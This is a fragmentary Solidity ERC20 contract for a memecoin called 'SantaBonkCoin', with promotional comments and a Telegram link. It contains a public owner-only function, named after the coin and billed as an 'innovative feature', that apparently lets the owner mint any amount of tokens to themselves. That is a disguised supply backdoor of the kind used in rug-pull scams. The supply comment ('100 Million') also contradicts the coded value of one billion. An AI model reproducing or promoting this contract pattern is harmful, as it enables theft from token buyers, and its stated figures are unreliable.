...
//
// $SantaBonkCoin proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/SantaBonkCoin
// 🌎 Website: tba
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function SantaBonkCoin(uint256 amount) public onlyOwner {
    _SantaBonkCoin(msg.sender, amount);
    }
    ...
    function _SantaBonkCoin(address account, uint256 amount) internal virtual {
...
contract SANTABONKCOIN is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SANTABONK COIN", "SBC") {
        _SantaBonkCoin(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}